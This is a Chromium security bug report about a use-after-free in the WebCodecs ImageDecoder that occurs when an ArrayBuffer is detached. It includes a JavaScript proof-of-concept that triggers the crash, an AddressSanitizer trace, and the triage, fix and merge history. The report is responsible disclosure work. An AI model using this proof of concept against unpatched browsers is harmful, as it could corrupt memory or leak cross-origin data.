# Security: UAF in ImageDecoderExternal due to ArrayBuffer Neuter

| Field | Value |
|-------|-------|
| **Issue ID** | [40053811](https://issues.chromium.org/issues/40053811) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Media>WebCodecs |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | bt...@gmail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2020-11-07 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

ImageDecoderExternal holds a raw pointer to the ArrayBuffer's backingstore that is passed in [1]. If the ArrayBuffer is Neutered then it leads to a UAF. WebCodecs is behind an origin trial so it is currently in stable [2].

```
  segment_reader_ = SegmentReader::CreateFromSkData( /\*\*\* 3 \*\*\*/  
      SkData::MakeWithoutCopy(buffer.Data(), buffer.ByteLengthAsSizeT()));  

```

[1] <https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/modules/webcodecs/image_decoder_external.cc;l=126-127;drc=c752526e8a29339257cbf2dd580218cb5e8cceab>  

[2] <https://developers.chrome.com/origintrials/#/trials/active>  

[3] MakeWithoutCopy holds a raw pointer to the ArrayBuffer backing store  

Note: Because SiteIsolation isn't rolled out on android this could also be used to read cross origin information using the freed backingstore

**VERSION**  

Chrome Version: 86.0.4230.2 + stable  

Chrome Version: head (674a1af241961b6e39fe56ad713866ce3a855b04)

**REPRODUCTION CASE**

<script>
'use strict';
let imageDecoder = null;
let arrayBuffer = null;
let tempArrayBufferRef = null;
let neuter = buffer => { try { postMessage("", "invalid", [buffer]) } catch (e) { } };
let CollectGarbage = async => {
for (var i = 0; i < 100; i++) {
new ArrayBuffer(0x1000000);
}
}
let createImageDecoder = async (buffer) => {
imageDecoder = new ImageDecoder({data: buffer, type: "image/png"});
};
async function init() {
let response = await fetch("download.png");
let tempArrayBuffer = await clone.arrayBuffer();
arrayBuffer = tempArrayBuffer.slice();
await createImageDecoder(arrayBuffer);
neuter(arrayBuffer);
CollectGarbage();
for (var i = 0; i < 100; i++)
await imageDecoder.decode(i);
}
setTimeout(function() {
init();
}, 1000);
</script>

CRASHES  

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x62100011d121 at pc 0x55ab055796c7 bp 0x7ffe97b53930 sp 0x7ffe97b530f8  

READ of size 4 at 0x62100011d121 thread T0 (chrome)  

==1==WARNING: invalid path to external symbolizer!  

==1==WARNING: Failed to use and restart external symbolizer!  

#0 0x55ab055796c6 in \_\_asan\_memcpy /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors\_memintrinsics.cpp:22:3  

#1 0x55ab064026a6 in cr\_png\_push\_fill\_buffer ./../../third\_party/libpng/pngpread.c:456:7  

#2 0x55ab064026a6 in cr\_png\_push\_read\_chunk ./../../third\_party/libpng/pngpread.c:186:7  

#3 0x55ab06400deb in cr\_png\_process\_some\_data ./../../third\_party/libpng/pngpread.c:109:10  

#4 0x55ab06400deb in cr\_png\_process\_data ./../../third\_party/libpng/pngpread.c:46:7  

#5 0x55ab1b39ddd6 in ProcessData ./../../third\_party/blink/renderer/platform/image-decoders/png/png\_image\_reader.cc:516:5  

#6 0x55ab1b39ddd6 in blink::PNGImageReader::Decode(blink::SegmentReader&, unsigned long) ./../../third\_party/blink/renderer/platform/image-decoders/png/png\_image\_reader.cc:159:35  

#7 0x55ab1b3991c6 in blink::PNGImageDecoder::Decode(unsigned long) ./../../third\_party/blink/renderer/platform/image-decoders/png/png\_image\_decoder.cc:96:19  

#8 0x55ab1b385839 in blink::ImageDecoder::DecodeFrameBufferAtIndex(unsigned long) ./../../third\_party/blink/renderer/platform/image-decoders/image\_decoder.cc:406:5  

#9 0x55ab21110ac8 in blink::ImageDecoderExternal::MaybeSatisfyPendingDecodes() ./../../third\_party/blink/renderer/modules/webcodecs/image\_decoder\_external.cc:318:29  

#10 0x55ab21110433 in blink::ImageDecoderExternal::decode(unsigned int, bool) ./../../third\_party/blink/renderer/modules/webcodecs/image\_decoder\_external.cc:152:3  

#11 0x55ab211087c6 in DecodeMethod ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_image\_decoder.cc:159:32  

#12 0x55ab211087c6 in blink::V8ImageDecoder::DecodeMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/modules/v8/v8\_image\_decoder.cc:289:3  

#13 0x55ab0c14b870 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) ./../../v8/src/api/api-arguments-inl.h:158:3  

#14 0x55ab0c1493a8 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:111:36  

#15 0x55ab0c146e58 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:141:5  

#16 0x55ab0e18fbb7 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit ??:0:0  

#17 0x55ab0e124694 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#18 0x55ab0e152240 in Builtins\_AsyncFunctionAwaitResolveClosure ??:0:0  

#19 0x55ab0e1dae97 in Builtins\_PromiseFulfillReactionJob ??:0:0  

#20 0x55ab0e144896 in Builtins\_RunMicrotasks ??:0:0  

#21 0x55ab0e122137 in Builtins\_JSRunMicrotasksEntry ??:0:0  

#22 0x55ab0c3cf81a in Call ./../../v8/src/execution/simulator.h:142:12  

#23 0x55ab0c3cf81a in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:383:33  

#24 0x55ab0c3d2fe8 in v8::internal::(anonymous namespace)::InvokeWithTryCatch(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:428:20  

#25 0x55ab0c3d3438 in v8::internal::Execution::TryRunMicrotasks(v8::internal::Isolate\*, v8::internal::MicrotaskQueue\*, v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution/execution.cc:505:10  

#26 0x55ab0c458262 in v8::internal::MicrotaskQueue::RunMicrotasks(v8::internal::Isolate\*) ./../../v8/src/execution/microtask-queue.cc:165:22  

#27 0x55ab0c457c55 in v8::internal::MicrotaskQueue::PerformCheckpoint(v8::Isolate\*) ./../../v8/src/execution/microtask-queue.cc:117:5  

#28 0x55ab0e4f7796 in blink::scheduler::MainThreadSchedulerImpl::OnTaskCompleted(base::WeakPtr[blink::scheduler::MainThreadTaskQueue](javascript:void(0);), base::sequence\_manager::Task const&, base::sequence\_manager::TaskQueue::TaskTiming\*, base::sequence\_manager::LazyNow\*) ./../../third\_party/blink/renderer/platform/scheduler/main\_thread/main\_thread\_scheduler\_impl.cc:2479:3  

#29 0x55ab0e502b2c in blink::scheduler::MainThreadTaskQueue::OnTaskCompleted(base::sequence\_manager::Task const&, base::sequence\_manager::TaskQueue::TaskTiming\*, base::sequence\_manager::LazyNow\*) ./../../third\_party/blink/renderer/platform/scheduler/main\_thread/main\_thread\_task\_queue.cc:175:29  

#30 0x55ab10506686 in base::sequence\_manager::internal::SequenceManagerImpl::NotifyDidProcessTask(base::sequence\_manager::internal::SequenceManagerImpl::ExecutingTask\*, base::sequence\_manager::LazyNow\*) ./../../base/task/sequence\_manager/sequence\_manager\_impl.cc:840:35  

#31 0x55ab10505f32 in base::sequence\_manager::internal::SequenceManagerImpl::DidRunTask() ./../../base/task/sequence\_manager/sequence\_manager\_impl.cc:665:3  

#32 0x55ab10530ec2 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:344:37  

#33 0x55ab1053061f in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:252:36  

#34 0x55ab1042e030 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:39:55  

#35 0x55ab10532106 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:446:12  

#36 0x55ab104a5a9a in base::RunLoop::Run() ./../../base/run\_loop.cc:124:14  

#37 0x55ab21c14e22 in content::RendererMain(content::MainFunctionParams const&) ./../../content/renderer/renderer\_main.cc:230:16  

#38 0x55ab0f39872f in content::RunZygote(content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:503:14  

#39 0x55ab0f39bc08 in content::ContentMainRunnerImpl::Run(bool) ./../../content/app/content\_main\_runner\_impl.cc:883:10  

#40 0x55ab0f53a00d in service\_manager::Main(service\_manager::MainParams const&) ./../../services/service\_manager/embedder/main.cc:453:29  

#41 0x55ab0f396bbf in content::ContentMain(content::ContentMainParams const&) ./../../content/app/content\_main.cc:19:10  

#42 0x55ab055a6643 in ChromeMain ./../../chrome/app/chrome\_main.cc:117:12  

#43 0x7f4cbc87bb96 in \_\_libc\_start\_main ??:0:0

0x62100011d121 is located 33 bytes inside of 4112-byte region [0x62100011d100,0x62100011e110)  

freed by thread T0 (chrome) here:  

#0 0x55ab055a439d in operator delete(void\*) /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_new\_delete.cpp:160:3  

#1 0x55ab0c6c97a4 in v8::internal::Worklist<std::\_\_1::pair<v8::internal::HeapObject, int>, 256>::~Worklist() ./../../v8/src/heap/worklist.h:79:7  

#2 0x55ab0c6c0277 in v8::internal::ScavengerCollector::CollectGarbage() ./../../v8/src/heap/scavenger.cc:427:1  

#3 0x55ab0c53ac7b in v8::internal::Heap::Scavenge() ./../../v8/src/heap/heap.cc:2442:25  

#4 0x55ab0c531f5a in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:2087:7  

#5 0x55ab0c52a642 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1593:13  

#6 0x55ab0c542763 in v8::internal::Heap::AllocateExternalBackingStore(std::\_\_1::function<void\* (unsigned long)> const&, unsigned long) ./../../v8/src/heap/heap.cc:2891:7  

#7 0x55ab0c92e350 in v8::internal::BackingStore::Allocate(v8::internal::Isolate\*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag) ./../../v8/src/objects/backing-store.cc:252:37  

#8 0x55ab0c165253 in v8::internal::(anonymous namespace)::ConstructBuffer(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::JSReceiver](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::InitializedFlag) ./../../v8/src/builtins/builtins-arraybuffer.cc:56:7  

#9 0x55ab0c160b3d in v8::internal::Builtin\_Impl\_ArrayBufferConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-arraybuffer.cc:92:12  

#10 0x55ab0e18fbb7 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit ??:0:0  

#11 0x55ab0e120424 in Builtins\_JSBuiltinsConstructStub ??:0:0  

#12 0x55ab0e21b77e in Builtins\_ConstructHandler ??:0:0  

#13 0x55ab0e124694 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#14 0x55ab0e11b9de in Builtins\_ArgumentsAdaptorTrampoline ??:0:0  

#15 0x55ab0e124694 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#16 0x55ab0e152240 in Builtins\_AsyncFunctionAwaitResolveClosure ??:0:0  

#17 0x55ab0e1dae97 in Builtins\_PromiseFulfillReactionJob ??:0:0  

#18 0x55ab0e144896 in Builtins\_RunMicrotasks ??:0:0  

#19 0x55ab0e122137 in Builtins\_JSRunMicrotasksEntry ??:0:0  

#20 0x55ab0c3cf81a in Call ./../../v8/src/execution/simulator.h:142:12  

#21 0x55ab0c3cf81a in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:383:33  

#22 0x55ab0c3d2fe8 in v8::internal::(anonymous namespace)::InvokeWithTryCatch(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:428:20  

#23 0x55ab0c3d3438 in v8::internal::Execution::TryRunMicrotasks(v8::internal::Isolate\*, v8::internal::MicrotaskQueue\*, v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution/execution.cc:505:10  

#24 0x55ab0c458262 in v8::internal::MicrotaskQueue::RunMicrotasks(v8::internal::Isolate\*) ./../../v8/src/execution/microtask-queue.cc:165:22  

#25 0x55ab0c457c55 in v8::internal::MicrotaskQueue::PerformCheckpoint(v8::Isolate\*) ./../../v8/src/execution/microtask-queue.cc:117:5  

#26 0x55ab0e4f7796 in blink::scheduler::MainThreadSchedulerImpl::OnTaskCompleted(base::WeakPtr[blink::scheduler::MainThreadTaskQueue](javascript:void(0);), base::sequence\_manager::Task const&, base::sequence\_manager::TaskQueue::TaskTiming\*, base::sequence\_manager::LazyNow\*) ./../../third\_party/blink/renderer/platform/scheduler/main\_thread/main\_thread\_scheduler\_impl.cc:2479:3  

#27 0x55ab0e502b2c in blink::scheduler::MainThreadTaskQueue::OnTaskCompleted(base::sequence\_manager::Task const&, base::sequence\_manager::TaskQueue::TaskTiming\*, base::sequence\_manager::LazyNow\*) ./../../third\_party/blink/renderer/platform/scheduler/main\_thread/main\_thread\_task\_queue.cc:175:29  

#28 0x55ab10506686 in base::sequence\_manager::internal::SequenceManagerImpl::NotifyDidProcessTask(base::sequence\_manager::internal::SequenceManagerImpl::ExecutingTask\*, base::sequence\_manager::LazyNow\*) ./../../base/task/sequence\_manager/sequence\_manager\_impl.cc:840:35  

#29 0x55ab10505f32 in base::sequence\_manager::internal::SequenceManagerImpl::DidRunTask() ./../../base/task/sequence\_manager/sequence\_manager\_impl.cc:665:3  

#30 0x55ab10530ec2 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:344:37

previously allocated by thread T0 (chrome) here:  

#0 0x55ab055a3b3d in operator new(unsigned long) /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_new\_delete.cpp:99:3  

#1 0x55ab0c6bc089 in NewSegment ./../../v8/src/heap/worklist.h:442:12  

#2 0x55ab0c6bc089 in Worklist ./../../v8/src/heap/worklist.h:69:33  

#3 0x55ab0c6bc089 in v8::internal::ScavengerCollector::CollectGarbage() ./../../v8/src/heap/scavenger.cc:258:25  

#4 0x55ab0c53ac7b in v8::internal::Heap::Scavenge() ./../../v8/src/heap/heap.cc:2442:25  

#5 0x55ab0c531f5a in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:2087:7  

#6 0x55ab0c52a642 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1593:13  

#7 0x55ab0c542763 in v8::internal::Heap::AllocateExternalBackingStore(std::\_\_1::function<void\* (unsigned long)> const&, unsigned long) ./../../v8/src/heap/heap.cc:2891:7  

#8 0x55ab0c92e350 in v8::internal::BackingStore::Allocate(v8::internal::Isolate\*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag) ./../../v8/src/objects/backing-store.cc:252:37  

#9 0x55ab0c165253 in v8::internal::(anonymous namespace)::ConstructBuffer(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::JSReceiver](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::InitializedFlag) ./../../v8/src/builtins/builtins-arraybuffer.cc:56:7  

#10 0x55ab0c160b3d in v8::internal::Builtin\_Impl\_ArrayBufferConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-arraybuffer.cc:92:12  

#11 0x55ab0e18fbb7 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit ??:0:0  

#12 0x55ab0e120424 in Builtins\_JSBuiltinsConstructStub ??:0:0  

#13 0x55ab0e21b77e in Builtins\_ConstructHandler ??:0:0  

#14 0x55ab0e124694 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#15 0x55ab0e11b9de in Builtins\_ArgumentsAdaptorTrampoline ??:0:0  

#16 0x55ab0e124694 in Builtins\_InterpreterEntryTrampoline ??:0:0  

#17 0x55ab0e152240 in Builtins\_AsyncFunctionAwaitResolveClosure ??:0:0  

#18 0x55ab0e1dae97 in Builtins\_PromiseFulfillReactionJob ??:0:0  

#19 0x55ab0e144896 in Builtins\_RunMicrotasks ??:0:0  

#20 0x55ab0e122137 in Builtins\_JSRunMicrotasksEntry ??:0:0  

#21 0x55ab0c3cf81a in Call ./../../v8/src/execution/simulator.h:142:12  

#22 0x55ab0c3cf81a in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:383:33  

#23 0x55ab0c3d2fe8 in v8::internal::(anonymous namespace)::InvokeWithTryCatch(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:428:20  

#24 0x55ab0c3d3438 in v8::internal::Execution::TryRunMicrotasks(v8::internal::Isolate\*, v8::internal::MicrotaskQueue\*, v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution/execution.cc:505:10  

#25 0x55ab0c458262 in v8::internal::MicrotaskQueue::RunMicrotasks(v8::internal::Isolate\*) ./../../v8/src/execution/microtask-queue.cc:165:22  

#26 0x55ab0c457c55 in v8::internal::MicrotaskQueue::PerformCheckpoint(v8::Isolate\*) ./../../v8/src/execution/microtask-queue.cc:117:5  

#27 0x55ab0e4f7796 in blink::scheduler::MainThreadSchedulerImpl::OnTaskCompleted(base::WeakPtr[blink::scheduler::MainThreadTaskQueue](javascript:void(0);), base::sequence\_manager::Task const&, base::sequence\_manager::TaskQueue::TaskTiming\*, base::sequence\_manager::LazyNow\*) ./../../third\_party/blink/renderer/platform/scheduler/main\_thread/main\_thread\_scheduler\_impl.cc:2479:3  

#28 0x55ab0e502b2c in blink::scheduler::MainThreadTaskQueue::OnTaskCompleted(base::sequence\_manager::Task const&, base::sequence\_manager::TaskQueue::TaskTiming\*, base::sequence\_manager::LazyNow\*) ./../../third\_party/blink/renderer/platform/scheduler/main\_thread/main\_thread\_task\_queue.cc:175:29  

#29 0x55ab10506686 in base::sequence\_manager::internal::SequenceManagerImpl::NotifyDidProcessTask(base::sequence\_manager::internal::SequenceManagerImpl::ExecutingTask\*, base::sequence\_manager::LazyNow\*) ./../../base/task/sequence\_manager/sequence\_manager\_impl.cc:840:35  

#30 0x55ab10505f32 in base::sequence\_manager::internal::SequenceManagerImpl::DidRunTask() ./../../base/task/sequence\_manager/sequence\_manager\_impl.cc:665:3  

#31 0x55ab10530ec2 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:344:37  

#32 0x55ab1053061f in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:252:36

SUMMARY: AddressSanitizer: heap-use-after-free (/home/n/chrome/86.0.4230.2/src/out/x64.asan/chrome+0x980c6c6)  

Shadow bytes around the buggy address:  

0x0c428001b9d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c428001b9e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c428001b9f0: 00 00 00 00 00 07 fa fa fa fa fa fa fa fa fa fa  

0x0c428001ba00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c428001ba10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

=>0x0c428001ba20: fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd  

0x0c428001ba30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c428001ba40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c428001ba50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c428001ba60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c428001ba70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==1==ABORTING

## Attachments

- [repro.tar.gz](attachments/repro.tar.gz) (application/octet-stream, 6.0 KB)

## Timeline

### [Deleted User] (2020-11-07)

[Empty comment from Monorail migration]

### bt...@gmail.com (2020-11-07)

For the reproduction just

1.) tar.xvf repro.tar.gz
2.) Run the caddy server https://caddyserver.com/
3.) navigate to min.html

### bt...@gmail.com (2020-11-07)

If this is eligible for reward, I will be doubling it up for charity supporting the EFF @adetaylor

### ke...@chromium.org (2020-11-09)

Thanks for the report.

dalecurtis@ are you able to have a look at this or triage further?

[Monorail components: Blink>Media>WebCodecs]

### da...@chromium.org (2020-11-09)

Thanks for the report. Will look into it immediately.

### da...@chromium.org (2020-11-09)

[Empty comment from Monorail migration]

### bt...@gmail.com (2020-11-09)

Please also add david@davidmanouchehri.com to this ticket

### da...@chromium.org (2020-11-09)

Fix here, https://chromium-review.googlesource.com/c/chromium/src/+/2527542 - we should consider an API design decision to transfer all incoming buffers to avoid this fragility though. Chris I leave that to you to lead.

### da...@chromium.org (2020-11-09)

[Empty comment from Monorail migration]

### da...@davidmanouchehri.com (2020-11-09)

Ah darn, looks like I'm too late to write a patch. =) 

### bt...@gmail.com (2020-11-09)

Credit Information: [$X + $X]  Brendon Tiszka and David Manouchehri supporting the @eff
@adetaylor

### ch...@chromium.org (2020-11-09)

> we should consider an API design decision to transfer all incoming buffers to avoid this fragility though. 

Will do. Filed https://github.com/WICG/web-codecs/issues/104

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-11-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/fa93fba6a28d384b0a0cddd63e85eb10cb97bb53

commit fa93fba6a28d384b0a0cddd63e85eb10cb97bb53
Author: Dale Curtis <dalecurtis@chromium.org>
Date: Tue Nov 10 02:04:13 2020

Ensure that buffers used by ImageDecoder haven't been neutered.

Since JavaScript may detach the underlying buffers, we need to check
to ensure they're still valid before using them for decoding.

Test: Updated unittests. Manual test case breaks.
Change-Id: Iefe5f8adf619cd6afdfedcb08a13c2996bfe0d32
Fixed: 1146761
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2527542
Commit-Queue: Dale Curtis <dalecurtis@chromium.org>
Auto-Submit: Dale Curtis <dalecurtis@chromium.org>
Reviewed-by: Dan Sanders <sandersd@chromium.org>
Cr-Commit-Position: refs/heads/master@{#825615}

[modify] https://crrev.com/fa93fba6a28d384b0a0cddd63e85eb10cb97bb53/third_party/blink/renderer/modules/webcodecs/image_decoder_external.cc
[modify] https://crrev.com/fa93fba6a28d384b0a0cddd63e85eb10cb97bb53/third_party/blink/renderer/modules/webcodecs/image_decoder_external.h
[modify] https://crrev.com/fa93fba6a28d384b0a0cddd63e85eb10cb97bb53/third_party/blink/renderer/modules/webcodecs/image_decoder_external_test.cc


### [Deleted User] (2020-11-10)

[Empty comment from Monorail migration]

### da...@chromium.org (2020-11-10)

MR-87 for security issue.

### [Deleted User] (2020-11-10)

This bug requires manual review: We are only 6 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna @(iOS), cindyb@(ChromeOS), lakpamarthy@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### da...@chromium.org (2020-11-10)

1. Yes.
2. https://chromium-review.googlesource.com/c/chromium/src/+/2527542
3. Not yet, but verified locally.
4. No.
5. Security fix.
6. For a feature in origin trial.
7. No.


### [Deleted User] (2020-11-10)

[Empty comment from Monorail migration]

### go...@google.com (2020-11-11)

+adetaylor@ (Security TPM) for merge review. 

### la...@google.com (2020-11-11)

dalecurtis@ - have you had a chance to check to look into the Canary coverage? 

### la...@google.com (2020-11-11)

let's pick this after M87 Stable promotion. Setting next action date to November, 17th.

### da...@chromium.org (2020-11-11)

Re c#20, canary coverage is good. Since this is behind an origin trial there aren't a lot of users yet.

### ad...@google.com (2020-11-12)

It looks like M87 will be delayed so also adding an M86 merge request for consideration.

### ad...@google.com (2020-11-13)

There's likely to be another M86 release after all, so approving merge to M86. Please merge to branch 4240 if there is no sign of trouble from Canary.

### da...@chromium.org (2020-11-13)

Hasn't been merged to m87 yet, do you want to me skip 87?

### ad...@google.com (2020-11-13)

Sorry, I realized that myself about 2 minutes ago :) Please also merge to M87, branch 4280.

### da...@chromium.org (2020-11-13)

CQ'd https://chromium-review.googlesource.com/c/chromium/src/+/2536356 for M87

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-11-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/db6d59c0b0a432d184b4b84249fcb126a8864f42

commit db6d59c0b0a432d184b4b84249fcb126a8864f42
Author: Dale Curtis <dalecurtis@chromium.org>
Date: Fri Nov 13 04:29:54 2020

Merge M87: "Ensure that buffers used by ImageDecoder haven't been neutered."

Since JavaScript may detach the underlying buffers, we need to check
to ensure they're still valid before using them for decoding.

TBR=sandersd

(cherry picked from commit fa93fba6a28d384b0a0cddd63e85eb10cb97bb53)

Test: Updated unittests. Manual test case breaks.
Change-Id: Iefe5f8adf619cd6afdfedcb08a13c2996bfe0d32
Fixed: 1146761
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2527542
Commit-Queue: Dale Curtis <dalecurtis@chromium.org>
Auto-Submit: Dale Curtis <dalecurtis@chromium.org>
Reviewed-by: Dan Sanders <sandersd@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#825615}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2536356
Reviewed-by: Dale Curtis <dalecurtis@chromium.org>
Cr-Commit-Position: refs/branch-heads/4280@{#1377}
Cr-Branched-From: ea420fb963f9658c9969b6513c56b8f47efa1a2a-refs/heads/master@{#812852}

[modify] https://crrev.com/db6d59c0b0a432d184b4b84249fcb126a8864f42/third_party/blink/renderer/modules/webcodecs/image_decoder_external.cc
[modify] https://crrev.com/db6d59c0b0a432d184b4b84249fcb126a8864f42/third_party/blink/renderer/modules/webcodecs/image_decoder_external.h
[modify] https://crrev.com/db6d59c0b0a432d184b4b84249fcb126a8864f42/third_party/blink/renderer/modules/webcodecs/image_decoder_external_test.cc


### go...@chromium.org (2020-11-13)

Please merge your change to M86 branch 4240 before 12:30 PM PDT, Friday, Nov 13th so we can take it in for M86 respin.Thank you. 

### da...@chromium.org (2020-11-13)

CQ'd for 86 here https://chromium-review.googlesource.com/c/chromium/src/+/2537781

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-11-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/381c4b56794f0d26b50a9641cf3740c7b9a1a466

commit 381c4b56794f0d26b50a9641cf3740c7b9a1a466
Author: Dale Curtis <dalecurtis@chromium.org>
Date: Fri Nov 13 21:06:58 2020

Merge M86: "Ensure that buffers used by ImageDecoder haven't been neutered."

Since JavaScript may detach the underlying buffers, we need to check
to ensure they're still valid before using them for decoding.

TBR=sandersd

(cherry picked from commit fa93fba6a28d384b0a0cddd63e85eb10cb97bb53)

Test: Updated unittests. Manual test case breaks.
